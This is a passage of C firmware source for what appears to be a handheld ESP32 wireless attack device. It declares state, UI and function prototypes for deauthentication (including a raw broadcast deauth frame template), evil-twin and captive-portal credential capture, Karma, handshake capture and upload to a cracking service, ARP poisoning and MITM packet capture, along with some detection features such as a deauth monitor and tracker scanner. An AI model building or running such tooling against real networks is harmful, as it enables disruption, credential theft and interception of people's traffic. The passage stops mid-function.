    uint8_t  bssid[6];
    char     ssid[33];
    uint8_t  channel;
    int8_t   rssi;
    wifi_auth_mode_t authmode;
    bool     written_to_file;
    float    latitude;
    float    longitude;
} wdp_network_t;

static wdp_ducb_channel_t wdp_ducb_channels[WDP_TOTAL_CHANNELS];
static int wdp_ducb_channel_count = 0;
static double wdp_ducb_discounted_total = 0.0;
static wdp_network_t *wdp_seen_networks = NULL;
static volatile int wdp_seen_count = 0;
static volatile int wdp_seen_capacity = 0;
static volatile int wdp_dwell_new_networks = 0;
static volatile bool wdp_needs_grow = false;

// Wardrive UI state
static lv_obj_t *wardrive_log_ta = NULL;
static lv_obj_t *wardrive_stop_btn = NULL;
static QueueHandle_t wardrive_log_queue = NULL;
static bool wardrive_log_capture_enabled = false;
static volatile bool wardrive_ui_active = false;

// Wardrive UI dashboard widgets
static lv_obj_t *wd_ui_gps_label = NULL;
static lv_obj_t *wd_ui_counter_label = NULL;
static lv_obj_t *wd_ui_header = NULL;
static lv_obj_t *wd_ui_table = NULL;
static lv_obj_t *wd_ui_channel_label = NULL;
static lv_timer_t *wd_ui_timer = NULL;
static volatile bool wd_ui_update_flag = false;
static volatile int wdp_current_channel = 0;

// Wardrive attack state
static TaskHandle_t wardrive_task_handle = NULL;
static StaticTask_t wardrive_task_buffer;
static StackType_t *wardrive_task_stack = NULL;
static volatile bool wardrive_active = false;
static int wardrive_file_counter = 1;

// Wardrive buffers (static to avoid stack overflow)
static char wardrive_gps_buffer[GPS_BUF_SIZE];
static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];

// Karma UI state
static lv_obj_t *karma_log_ta = NULL;
static lv_obj_t *karma_stop_btn = NULL;
static lv_obj_t *karma_content = NULL;
static lv_obj_t *karma_probe_dd = NULL;
static lv_obj_t *karma_html_dd = NULL;
static lv_obj_t *karma_start_btn = NULL;
static QueueHandle_t karma_log_queue = NULL;
static bool karma_log_capture_enabled = false;
static volatile bool karma_ui_active = false;
static lv_obj_t *karma_info_ssid_label = NULL;
static lv_obj_t *karma_info_filename_label = NULL;
static QueueHandle_t karma_event_queue = NULL;
static char karma_selected_html_name[64] = "default";
static char karma_selected_ssid[33] = "";
static int karma_probe_index_map[MAX_PROBE_REQUESTS];  // Map dropdown index to actual probe index
static int karma_valid_probe_count = 0;  // Number of valid probes in dropdown

// Portal UI state (setup page)
static lv_obj_t *portal_content = NULL;
static lv_obj_t *portal_ssid_ta = NULL;
static lv_obj_t *portal_html_dd = NULL;
static lv_obj_t *portal_start_btn = NULL;
static lv_obj_t *portal_keyboard = NULL;
static char portal_ssid_buffer[33] = "Free WiFi";

// Portal Running UI state
static lv_obj_t *portal_log_ta = NULL;
static lv_obj_t *portal_stop_btn = NULL;
static lv_obj_t *portal_info_ssid_label = NULL;
static lv_obj_t *portal_info_filename_label = NULL;
static QueueHandle_t portal_event_queue = NULL;
static bool portal_log_capture_enabled = false;
static volatile bool portal_ui_active = false;
static char portal_selected_html_name[64] = "";

// WiFi Connect screen state (for ARP Poison, Rogue AP, WPA-SEC Upload, MITM)
#define PENDING_ATTACK_ARP_POISON   0
#define PENDING_ATTACK_ROGUE_AP     1
#define PENDING_ATTACK_WPA_SEC      2
#define PENDING_ATTACK_MITM         3
static int pending_attack_type = 0;
static char wifi_connect_ssid[33] = "";
static char wifi_connect_password[64] = "";
static uint8_t wifi_connect_bssid[6] = {0};
static uint8_t wifi_connect_channel = 0;
static lv_obj_t *wifi_connect_ta = NULL;
static lv_obj_t *wifi_connect_keyboard = NULL;
static lv_obj_t *wifi_connect_status_label = NULL;
static lv_obj_t *wifi_connect_btn = NULL;
static lv_obj_t *wifi_connect_next_btn = NULL;
static volatile bool sta_connect_success = false;
static volatile bool sta_connect_failed = false;
static volatile int sta_connect_attempt_count = 0;
static lv_timer_t *sta_connect_check_timer = NULL;

// WPA-SEC Upload state
static char wpasec_api_key[WPASEC_KEY_MAX_LEN] = "";
static lv_obj_t *wpasec_status_list = NULL;
static lv_obj_t *wpasec_progress_label = NULL;
static lv_timer_t *wpasec_upload_timer = NULL;
static volatile bool wpasec_upload_done = false;
static volatile bool wpasec_upload_active = false;
static TaskHandle_t wpasec_upload_task_handle = NULL;

// SD Card settings screen state
typedef struct { char line[96]; } sd_prov_update_t;
static lv_obj_t    *sd_provision_log_ta       = NULL;
static lv_obj_t    *sd_provision_status_label = NULL;
static lv_obj_t    *sd_prov_back_btn          = NULL;
static volatile bool sd_provision_active      = false;
static StackType_t *sd_provision_task_stack   = NULL;
static StaticTask_t sd_provision_task_buf;

typedef struct {
    char text[192];
    lv_color_t color;
} wpasec_ui_msg_t;

static QueueHandle_t wpasec_ui_queue = NULL;

// Rogue AP UI state
static lv_obj_t *rogue_ap_content = NULL;
static lv_obj_t *rogue_ap_html_dd = NULL;
static lv_obj_t *rogue_ap_start_btn = NULL;
static lv_obj_t *rogue_ap_status_list = NULL;
static int rogue_ap_html_map[64];
static int rogue_ap_html_count = 0;
static QueueHandle_t rogue_ap_event_queue = NULL;

// ARP Poisoning state
#define ARP_PACKET_SIZE 42
#define ETH_TYPE_ARP    0x0806
#define ARP_HWTYPE_ETH  1
#define ARP_PROTO_IP    0x0800
#define ARP_OP_REPLY    2
#define ARP_MAX_HOSTS   32

typedef struct {
    ip4_addr_t ip;
    uint8_t mac[6];
} arp_host_entry_t;

static arp_host_entry_t arp_hosts[ARP_MAX_HOSTS];
static int arp_host_count = 0;
static volatile bool arp_ban_active = false;
static TaskHandle_t arp_ban_task_handle = NULL;
static uint8_t arp_ban_target_mac[6];
static ip4_addr_t arp_ban_target_ip;
static uint8_t arp_ban_gateway_mac[6];
static ip4_addr_t arp_ban_gateway_ip;
static volatile bool arp_scan_done = false;
static lv_obj_t *arp_poison_overlay = NULL;
static lv_obj_t *arp_poison_status_label = NULL;
static lv_timer_t *arp_scan_check_timer = NULL;

// MITM Capture state
#define MITM_MAX_HOSTS    64
#define MITM_QUEUE_SIZE   256
#define MITM_MAX_FRAME    1600
#define LINKTYPE_ETHERNET   1
#define LINKTYPE_IEEE80211  105

typedef struct {
    uint16_t len;
    int64_t timestamp_us;
    uint8_t data[];
} mitm_queued_frame_t;

typedef struct {
    ip4_addr_t ip;
    uint8_t mac[6];
} mitm_host_entry_t;

static mitm_host_entry_t *mitm_hosts = NULL;
static int mitm_host_count = 0;
static volatile bool mitm_arp_active = false;
static volatile bool mitm_capture_active = false;
static FILE *mitm_pcap_file = NULL;
static QueueHandle_t mitm_packet_queue = NULL;
static volatile uint32_t mitm_frame_count = 0;
static volatile uint32_t mitm_drop_count = 0;
static volatile uint32_t mitm_tcp_count = 0;
static volatile uint32_t mitm_udp_count = 0;
static volatile uint32_t mitm_icmp_count = 0;
static volatile uint32_t mitm_arp_pkt_count = 0;
static volatile uint32_t mitm_other_proto_count = 0;
static TaskHandle_t mitm_arp_task_handle = NULL;
static TaskHandle_t mitm_writer_task_handle = NULL;
static netif_input_fn mitm_original_input = NULL;
static netif_linkoutput_fn mitm_original_linkoutput = NULL;
static uint32_t mitm_gateway_ip = 0;
static uint8_t mitm_gateway_mac[6] = {0};
static uint8_t mitm_own_mac[6] = {0};
static volatile bool mitm_scan_done = false;
static lv_obj_t *mitm_status_label = NULL;
static lv_obj_t *mitm_hosts_label = NULL;
static lv_obj_t *mitm_stats_label = NULL;
static lv_obj_t *mitm_file_label = NULL;
static lv_timer_t *mitm_scan_check_timer = NULL;
static lv_timer_t *mitm_update_timer = NULL;
static char mitm_pcap_filepath[64] = "";

// BLE Scan UI state
static lv_obj_t *ble_scan_content = NULL;
static lv_obj_t *ble_scan_list = NULL;
static lv_obj_t *ble_scan_status_label = NULL;
static volatile bool ble_scan_ui_active = false;
static volatile bool ble_scan_needs_ui_update = false;
static volatile bool ble_scan_finished = false;
static char ble_scan_status_text[48] = "";

// Deauth Monitor state
#define DEAUTH_MONITOR_MAX_ATTACKS 50
typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t channel;
    uint32_t timestamp;
} deauth_monitor_attack_t;

static TaskHandle_t deauth_monitor_task_handle = NULL;
static StaticTask_t deauth_monitor_task_buffer;
static StackType_t *deauth_monitor_task_stack = NULL;
static volatile bool deauth_monitor_active = false;
static int deauth_monitor_current_channel = 1;
static int deauth_monitor_channel_index = 0;
static int64_t deauth_monitor_last_channel_hop = 0;

static deauth_monitor_attack_t deauth_monitor_attacks[DEAUTH_MONITOR_MAX_ATTACKS];
static volatile int deauth_monitor_attack_count = 0;
static portMUX_TYPE deauth_monitor_spin = portMUX_INITIALIZER_UNLOCKED;

// Deauth Monitor UI state
static lv_obj_t *deauth_monitor_list = NULL;
static lv_obj_t *deauth_monitor_status_label = NULL;
static lv_obj_t *deauth_monitor_known_label = NULL;
static lv_obj_t *deauth_monitor_rec_label = NULL;
static volatile bool deauth_monitor_ui_active = false;
static volatile bool deauth_monitor_update_flag = false;
static volatile bool deauth_monitor_scan_pending = false;  // Waiting for initial scan to complete

// Deauth Monitor PCAP capture to SD
typedef struct {
    uint8_t  frame[512];    // raw 802.11 frame bytes
    uint16_t len;
    int8_t   rssi;
    int64_t  timestamp_us;
} deauth_pcap_frame_t;

static QueueHandle_t deauth_pcap_queue = NULL;
static FILE         *deauth_pcap_file  = NULL;
static char          deauth_pcap_path[64] = "";

// AirTag Scanner state
static TaskHandle_t airtag_scan_task_handle = NULL;
static StaticTask_t airtag_scan_task_buffer;
static StackType_t *airtag_scan_task_stack = NULL;
static volatile bool airtag_scan_active = false;

// AirTag Scanner UI state
static lv_obj_t *airtag_scan_status_label = NULL;
static lv_obj_t *airtag_scan_stats_label1 = NULL;  // Air Tags: X / Smart Tags: X (two lines)
static lv_obj_t *airtag_scan_stats_label2 = NULL;  // Other BT Devices: X
static lv_obj_t *airtag_scan_stats_label3 = NULL;  // Total BT devices: X
static lv_obj_t *airtag_view_tags_btn = NULL;       // "View Tags" button (shown when tags found)
static volatile bool airtag_scan_ui_active = false;

// BT Locator UI state
static lv_obj_t *bt_locator_content = NULL;
static lv_obj_t *bt_locator_list = NULL;
static lv_obj_t *bt_locator_status_label = NULL;
static lv_obj_t *bt_locator_rssi_label = NULL;
static lv_obj_t *bt_locator_mac_label = NULL;
static lv_obj_t *bt_locator_exit_btn = NULL;
static volatile bool bt_locator_ui_active = false;
static volatile bool bt_locator_tracking_active = false;
static volatile bool bt_locator_needs_ui_update = false;
static char bt_locator_status_text[48] = "";

// BT tracking mode support (for BT Locator)
static bool bt_tracking_mode = false;

// Battery voltage monitor state (DISABLED - using regular C5 chip)
static lv_obj_t *battery_label = NULL;  // Keep for UI layout
static char last_voltage_str[32] = "";  // Empty = no valid reading, hide label
static adc_oneshot_unit_handle_t battery_adc_handle = NULL;
static adc_cali_handle_t battery_adc_cali_handle = NULL;
static StaticTask_t battery_task_buffer;
static StackType_t *battery_task_stack = NULL;
static TaskHandle_t battery_task_handle = NULL;
static uint8_t bt_tracking_mac[6] = {0};
static volatile int8_t bt_tracking_rssi = 0;
static volatile bool bt_tracking_found = false;
static char bt_tracking_name[32] = "";
static TaskHandle_t bt_locator_task_handle = NULL;
static volatile bool airtag_scan_update_flag = false;

// BT Scan & Select UI state
static lv_obj_t *bt_sas_list = NULL;
static lv_obj_t *bt_sas_status_label = NULL;
static lv_obj_t *bt_sas_next_btn = NULL;
static volatile bool bt_sas_ui_active = false;
static volatile bool bt_sas_needs_update = false;
static int bt_sas_selected_idx = -1;
static uint8_t bt_sas_target_addr[6];
static uint8_t bt_sas_target_addr_type = 0;
static char bt_sas_target_name[32];

// ── BT Lookout (Dee Dee Detector) UI state ──────────────────────
static bool        bt_lookout_ui_active       = false;
static lv_obj_t   *bt_lookout_status_lbl       = NULL;
static lv_obj_t   *bt_lookout_count_lbl        = NULL;
static lv_obj_t   *bt_lookout_last_lbl         = NULL;
static lv_obj_t   *bt_lookout_start_btn        = NULL;
static lv_obj_t   *bt_lookout_edit_btn         = NULL;
static lv_obj_t   *bt_lookout_oui_btn          = NULL;
static lv_obj_t   *bt_lookout_popup_obj        = NULL;
static lv_timer_t *bt_lookout_popup_tmr        = NULL;
static TaskHandle_t bt_lookout_scan_loop_handle = NULL;

// ── GATT Walker UI state ─────────────────────────────────────────
static bool       gw_screen_active   = false;
static lv_obj_t  *gw_status_lbl      = NULL;
static lv_obj_t  *gw_svc_lbl         = NULL;
static lv_obj_t  *gw_chr_lbl         = NULL;
static lv_obj_t  *gw_result_lbl      = NULL;
static lv_obj_t  *gw_cancel_btn      = NULL;
static lv_obj_t  *gw_back_btn        = NULL;

// Snapshot values for UI (copied before reset)
static volatile int airtag_scan_snapshot_airtag = 0;
static volatile int airtag_scan_snapshot_smarttag = 0;
static volatile int airtag_scan_snapshot_total = 0;

// Promiscuous filter
static const wifi_promiscuous_filter_t sniffer_filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Deauth frame template
static const uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified
};

static void scan_checkbox_event_cb(lv_event_t *e);
void lvgl_flush_cb(lv_disp_drv_t *drv, const lv_area_t *area, lv_color_t *color_p);
static bool on_color_trans_done(esp_lcd_panel_io_handle_t io,
                                esp_lcd_panel_io_event_data_t *edata,
                                void *user_ctx);
void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data);
void attack_event_cb(lv_event_t *e);
void menu_event_cb(lv_event_t *e);
lv_obj_t *create_menu_item(lv_obj_t *parent, const char *icon, const char *text);
lv_obj_t *create_clickable_item(lv_obj_t *parent, const char *icon, const char *text, lv_event_cb_t callback, const char *user_data);
void show_function_page(const char *name);
void show_menu(void);
void back_to_menu_cb(lv_event_t *e);

// Tile-based navigation system
static lv_obj_t *tiles_container = NULL;
static lv_obj_t *home_bg_img = NULL;

// ── Disco mode Easter egg ──────────────────────────────────────────────────
typedef struct { uint8_t r, g, b; } disco_rgb_t;
// 70s tie-dye screen palette (full brightness for display)
static const disco_rgb_t DISCO_PALETTE[8] = {
    {255,  20, 147},  // hot pink
    {255, 140,   0},  // orange
    {255, 230,   0},  // yellow
    { 80, 255,   0},  // lime
    {  0, 220, 255},  // cyan
    {160,   0, 255},  // purple
    { 30, 100, 255},  // electric blue
    {255,  60,   0},  // red-orange
};
// LED values at 60% brightness for the WS2812
static const disco_rgb_t DISCO_LED_PAL[8] = {
    {153,  12,  88},
    {153,  84,   0},
    {153, 138,   0},
    { 48, 153,   0},
    {  0, 132, 153},
    { 96,   0, 153},
    { 18,  60, 153},
    {153,  36,   0},
};
#define DISCO_NC 8

static int            settings_tap_count  = 0;
static lv_timer_t    *settings_nav_timer  = NULL;
static volatile bool  disco_mode_active   = false;
static TaskHandle_t   disco_task_handle   = NULL;
static lv_obj_t      *disco_screen_obj    = NULL;
static lv_obj_t      *disco_layers[4]     = {NULL};
static volatile uint8_t disco_color_idx   = 0;
static volatile bool  disco_needs_update  = false;
static volatile uint8_t disco_led_r = 0, disco_led_g = 0, disco_led_b = 0;
static volatile bool  disco_led_needs_update = false;
static lv_obj_t *create_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data);
static void show_main_tiles(void);
static void show_wifi_scan_attack_screen(void);
static void show_attack_tiles_screen(void);
static void show_global_attacks_screen(void);
static void show_sniff_karma_screen(void);
static void show_wifi_monitor_screen(void);
static void show_eviltwin_passwords_screen(void);
static void show_portal_data_screen(void);
static void show_handshakes_list_screen(void);
static void wifi_monitor_tile_event_cb(lv_event_t *e);
static void show_bluetooth_screen(void);
static void show_stub_screen(const char *name, void (*back_fn)(void));
static void main_tile_event_cb(lv_event_t *e);
static void attack_tile_event_cb(lv_event_t *e);
static void update_sniffer_button_ui(void);
static void show_settings_screen(void);
static void settings_tile_event_cb(lv_event_t *e);
static void show_sd_card_screen(void);
static void show_gps_info_screen(void);
static void show_found_tags_screen(void);
static void show_tag_tracker_screen(int dev_idx);
static void airtag_view_tags_btn_cb(lv_event_t *e);
static void found_tags_back_btn_cb(lv_event_t *e);
static void show_sd_provision_confirm(bool after_format);
static void show_sd_provision_running_screen(bool after_format);
static void home_btn_event_cb(lv_event_t *e);
static void wifi_scan_next_btn_cb(lv_event_t *e);
static void deauth_quit_event_cb(lv_event_t *e);
static void deauth_rescan_timer_stop(void);
static void set_screenshot_buttons_disabled(bool disabled);
static void screenshot_finish_ui_cb(void *user_data);
static void screenshot_save_task(void *arg);

// Reset all child pointers when function_page is deleted
static void reset_function_page_children(void) {
    scan_status_label = NULL;
    scan_list = NULL;
    deauth_list = NULL;
    deauth_prompt_label = NULL;
    deauth_fps_label = NULL;
    deauth_pause_btn = NULL;
    deauth_quit_btn = NULL;
    evil_twin_network_dd = NULL;
    evil_twin_html_dd = NULL;
    evil_twin_start_btn = NULL;
    evil_twin_status_label = NULL;
    evil_twin_log_ta = NULL;
    evil_twin_content = NULL;
    evil_twin_ssid_label = NULL;
    evil_twin_deauth_list_label = NULL;
    evil_twin_status_list = NULL;
    blackout_networks_label = NULL;
    blackout_status_label = NULL;
    blackout_stop_btn = NULL;
    snifferdog_kick_label = NULL;
    snifferdog_recent_label = NULL;
    snifferdog_stop_btn = NULL;
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sniffer_start_btn = NULL;
    sniffer_packets_label = NULL;
    sniffer_aps_label = NULL;
    sniffer_probes_label = NULL;
    sniffer_channel_label = NULL;
    sniffer_ap_list = NULL;
    sniffer_observe_mode = false;
    sniffer_observe_ap_index = -1;
    sae_overflow_log_ta = NULL;
    sae_overflow_stop_btn = NULL;
    handshake_log_ta = NULL;
    handshake_stop_btn = NULL;
    handshake_status_list = NULL;
    wardrive_log_ta = NULL;
    wardrive_stop_btn = NULL;
    wardrive_ui_active = false;
    if (wd_ui_timer) { lv_timer_del(wd_ui_timer); wd_ui_timer = NULL; }
    if (wd_ui_gps_label && lv_obj_is_valid(wd_ui_gps_label)) lv_obj_del(wd_ui_gps_label);
    wd_ui_gps_label = NULL;
    wd_ui_counter_label = NULL;
    wd_ui_channel_label = NULL;
    wd_ui_header = NULL;
    wd_ui_table = NULL;
    karma_log_ta = NULL;
    karma_stop_btn = NULL;
    karma_content = NULL;
    karma_probe_dd = NULL;
    karma_html_dd = NULL;
    karma_start_btn = NULL;
    karma_info_ssid_label = NULL;
    karma_info_filename_label = NULL;
    portal_content = NULL;
    portal_ssid_ta = NULL;
    portal_html_dd = NULL;
    portal_start_btn = NULL;
    portal_keyboard = NULL;
    ble_scan_content = NULL;
    ble_scan_list = NULL;
    ble_scan_status_label = NULL;
    screenshot_btn = NULL;
    deauth_monitor_list = NULL;
    deauth_monitor_status_label = NULL;
    deauth_monitor_known_label = NULL;
    bt_sas_list = NULL;
    bt_sas_status_label = NULL;
    bt_sas_next_btn = NULL;
    bt_sas_ui_active = false;
    bt_sas_selected_idx = -1;
    airtag_scan_status_label = NULL;
    airtag_scan_stats_label1 = NULL;
    airtag_scan_stats_label2 = NULL;
    airtag_scan_stats_label3 = NULL;
    airtag_view_tags_btn = NULL;
    deauth_monitor_rec_label = NULL;
    bt_locator_content = NULL;
    bt_locator_list = NULL;
    bt_locator_status_label = NULL;
    bt_locator_rssi_label = NULL;
    bt_locator_mac_label = NULL;
    bt_locator_exit_btn = NULL;
    wifi_connect_ta = NULL;
    wifi_connect_keyboard = NULL;
    wifi_connect_status_label = NULL;
    wifi_connect_btn = NULL;
    wifi_connect_next_btn = NULL;
    if (sta_connect_check_timer) {
        lv_timer_del(sta_connect_check_timer);
        sta_connect_check_timer = NULL;
    }
    // WPA-SEC upload cleanup
    wpasec_status_list = NULL;
    wpasec_progress_label = NULL;
    wpasec_upload_active = false;  // Signal background task to stop
    if (wpasec_upload_timer) {
        lv_timer_del(wpasec_upload_timer);
        wpasec_upload_timer = NULL;
    }
}

static void create_function_page_base(const char *name);
void show_function_page(const char *name);
static void show_evil_twin_page(void);
static void evil_twin_start_btn_cb(lv_event_t *e);
static esp_err_t evil_twin_enable_log_capture(void);
static void evil_twin_ui_event_callback(evil_twin_event_data_t *data);
static void evil_twin_disable_log_capture(void);
static void blackout_yes_btn_cb(lv_event_t *e);
static void blackout_stop_btn_cb(lv_event_t *e);
static esp_err_t blackout_enable_log_capture(void);
static void blackout_disable_log_capture(void);
static void snifferdog_yes_btn_cb(lv_event_t *e);
static void snifferdog_stop_btn_cb(lv_event_t *e);
static esp_err_t snifferdog_enable_log_capture(void);
static void snifferdog_disable_log_capture(void);
static void sniffer_yes_btn_cb(lv_event_t *e);
static void sniffer_enough_btn_cb(lv_event_t *e);
static esp_err_t sniffer_enable_log_capture(void);
static void sniffer_disable_log_capture(void);
static void sniffer_task(void *pvParameters);
static void sniffer_ap_click_cb(lv_event_t *e);
static void sniffer_observe_close_cb(lv_event_t *e);
static void sniffer_refresh_ap_list(void);
static void sniffer_client_click_cb(lv_event_t *e);
static void show_targeted_deauth_screen(void);
static void targeted_deauth_timer_cb(lv_timer_t *timer);
static void targeted_deauth_stop_cb(lv_event_t *e);
static void sniffer_refresh_observe_view(void);
static void sniffer_new_client_notify(void);
static void sae_overflow_yes_btn_cb(lv_event_t *e);
static void sae_overflow_stop_btn_cb(lv_event_t *e);
static esp_err_t sae_overflow_enable_log_capture(void);
static void sae_overflow_disable_log_capture(void);
static void handshake_yes_btn_cb(lv_event_t *e);
static void handshake_stop_btn_cb(lv_event_t *e);
static esp_err_t handshake_enable_log_capture(void);
static void handshake_disable_log_capture(void);
static void handshake_attack_task(void *pvParameters);
static void handshake_attack_task_selected(void);
static void handshake_attack_task_sniffer(void);
static void attack_network_with_burst(const wifi_ap_record_t *ap);
static bool check_handshake_file_exists(const char *ssid);
static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid);
static void handshake_cleanup(void);
// D-UCB and sniffer handshake helpers
static void ducb_init(void);
static int ducb_select_channel(void);
static void ducb_update(int channel_idx, double reward);
static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel);
static bool hs_save_handshake_to_sd(int ap_idx);
// Wardrive promisc helpers
static void wdp_ducb_init(void);
static int wdp_ducb_select_channel(void);
static void wdp_ducb_update(int channel_idx, double reward);
static int wdp_get_dwell_ms(wdp_channel_tier_t tier);
static void wdp_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void wardrive_promisc_task(void *pvParameters);
static void sniffer_dog_channel_hop(void);
static void sniffer_dog_task(void *pvParameters);
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void wardrive_start_btn_cb(lv_event_t *e);
static void wardrive_stop_btn_cb(lv_event_t *e);
static esp_err_t wardrive_enable_log_capture(void);
static void wardrive_disable_log_capture(void);
static void wardrive_task(void *pvParameters);
static void show_karma_page(void);
static void karma_start_btn_cb(lv_event_t *e);
static void karma_stop_btn_cb(lv_event_t *e);
static esp_err_t karma_enable_log_capture(void);
static void karma_disable_log_capture(void);
static void show_portal_page(void);
static void portal_ssid_ta_event_cb(lv_event_t *e);
static void portal_keyboard_event_cb(lv_event_t *e);
static void portal_start_btn_cb(lv_event_t *e);
static void portal_stop_btn_cb(lv_event_t *e);
static esp_err_t portal_enable_log_capture(void);
static void portal_disable_log_capture(void);
static void portal_ui_event_callback(evil_twin_event_data_t *data);
static void karma_ui_event_callback(evil_twin_event_data_t *data);
static void get_timestamp_string(char* buffer, size_t size);
static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
static bool wait_for_gps_fix(int timeout_seconds);
void load_whitelist_from_sd(void);
bool is_bssid_whitelisted(const uint8_t *bssid);

// WiFi Connect screen (ARP Poison, Rogue AP, WPA-SEC Upload, MITM)
static void show_wifi_connect_screen(void);
static void show_arp_poison_page(void);
static void show_rogue_ap_page(void);
static void show_wpa_sec_upload_page(void);
static void show_mitm_page(void);
static void stop_arp_ban(void);

// WPA-SEC upload helpers
static bool wpasec_read_key_from_sd(void);
static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len);
static int wpasec_upload_file(const char *filepath, const char *filename);
static void wpasec_upload_task(void *pvParameters);
static void wpasec_upload_timer_cb(lv_timer_t *timer);

// Radio mode switching (WiFi <-> BLE)
static bool ensure_wifi_mode(void);
static bool ensure_ble_mode(void);
static void radio_reset_to_idle(void);

// NimBLE BLE scanner functions
static esp_err_t bt_nimble_init(void);
static void bt_nimble_deinit(void);
static void apply_ble_power_settings(void);
static void bt_scan_stop(void);
static void bt_scan_task(void *pvParameters);
static int bt_gap_event_callback(struct ble_gap_event *event, void *arg);
static void bt_on_sync(void);
static void bt_on_reset(int reason);
static void nimble_host_task(void *param);
static int bt_start_scan(void);
static void bt_stop_scan(void);
static bool bt_is_device_found(const uint8_t *addr);
static int bt_find_device_index(const uint8_t *addr);
static void bt_add_found_device(const uint8_t *addr);
static void bt_reset_counters(void);
static void bt_format_addr(const uint8_t *addr, char *str);
static bool bt_is_apple_airtag(const uint8_t *data, uint8_t len, bool has_name);
static bool bt_is_samsung_smarttag(const uint8_t *data, uint8_t len);

// BLE Scan UI
static void ble_scan_back_btn_cb(lv_event_t *e);
static void ble_scan_update_list(void);

// WiFi menu screen
static void show_wifi_menu_screen(void);

// Disco mode Easter egg
static void show_disco_mode(void);
static void settings_nav_timer_cb(lv_timer_t *t);
static void disco_pre_pause_end(lv_timer_t *t);
static void disco_touch_exit(lv_event_t *e);
static void disco_check_task_done(lv_timer_t *t);
static void disco_post_pause_end(lv_timer_t *t);
static void disco_task(void *arg);

// BT Scan & Select
static void show_bt_scan_select_screen(void);
static void show_bt_attack_tiles_screen(void);
static void bt_sas_refresh_list(void);

// Data Transfer screens
static void show_data_transfer_screen(void);
static void show_ap_file_server_screen(void);
static void show_wifi_client_server_screen(void);
static void show_bt_locator_direct_track(void);

// GATT Walker
static void show_gatt_walker_screen(void);
static void gw_update_screen_ui(void);
static void gw_deferred_start_cb(lv_timer_t *t);

// BT Lookout
static void show_bt_lookout_screen(void);
static void show_add_oui_entry_screen(void);
static void bt_lookout_update_ui(void);
static void show_lookout_alert_popup(const char *name, const char *mac_str, int rssi);
static void lookout_popup_dismiss_cb(lv_event_t *e);
static void lookout_popup_auto_dismiss_cb(lv_timer_t *t);
static void show_lookout_editor_screen(void);
static void lookout_edit_btn_cb(lv_event_t *e);
static void show_oui_groups_screen(void);
static void lookout_oui_btn_cb(lv_event_t *e);

// Deauth Monitor functions
static void show_deauth_monitor_screen(void);
static void deauth_monitor_exit_cb(lv_event_t *e);
static void deauth_monitor_start_monitoring(void);
static void deauth_monitor_task(void *pvParameters);
static void deauth_monitor_channel_hop(void);
static void deauth_monitor_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static const char* deauth_monitor_find_ssid_by_bssid(const uint8_t *bssid);

// AirTag Scanner functions
static void show_airtag_scan_screen(void);
static void airtag_scan_exit_cb(lv_event_t *e);
static void airtag_scan_task(void *pvParameters);

// BT Locator functions
static void show_bt_locator_screen(void);
static void bt_locator_device_selected_cb(lv_event_t *e);
static void bt_locator_exit_cb(lv_event_t *e);
static void bt_locator_tracking_task(void *pvParameters);
static void bt_locator_update_list(void);

static void sniffer_ui_async_cb(void *arg) {
    (void)arg;
    update_sniffer_button_ui();
}

static void wifi_scan_done_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
        // Use separate flag for deauth rescan to avoid conflicts
        if (deauth_rescan_active) {
            deauth_rescan_done_flag = true;
        } else {
            scan_done_ui_flag = true;
        }
    }
    // Ensure button UI matches actual sniffer state (in case we auto-started)
    lv_async_call(sniffer_ui_async_cb, NULL);
}

static void scan_checkbox_event_cb(lv_event_t *e)
{
    lv_obj_t *cb = lv_event_get_target(e);
    int index = (int)(intptr_t)lv_event_get_user_data(e);
    bool checked = lv_obj_has_state(cb, LV_STATE_CHECKED);
    wifi_scanner_select_network(index, checked);
}

static int dual_vprintf(const char *fmt, va_list ap)
{
    va_list ap_copy, ap_copy2, ap_copy3, ap_copy4, ap_copy5, ap_copy6, ap_copy7;
    va_copy(ap_copy, ap);
    va_copy(ap_copy2, ap);
    va_copy(ap_copy3, ap);
    va_copy(ap_copy4, ap);
    va_copy(ap_copy5, ap);
    va_copy(ap_copy6, ap);
    va_copy(ap_copy7, ap);

    int ret = rom_vprintf(fmt, ap);

    if (evil_twin_log_capture_enabled && evil_twin_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(evil_twin_log_queue, &msg, 0);
            }
        }
    }

    if (blackout_log_capture_enabled && blackout_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy2);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(blackout_log_queue, &msg, 0);
            }
        }
    }

    if (snifferdog_log_capture_enabled && snifferdog_log_queue) {
        evil_log_msg_t msg;
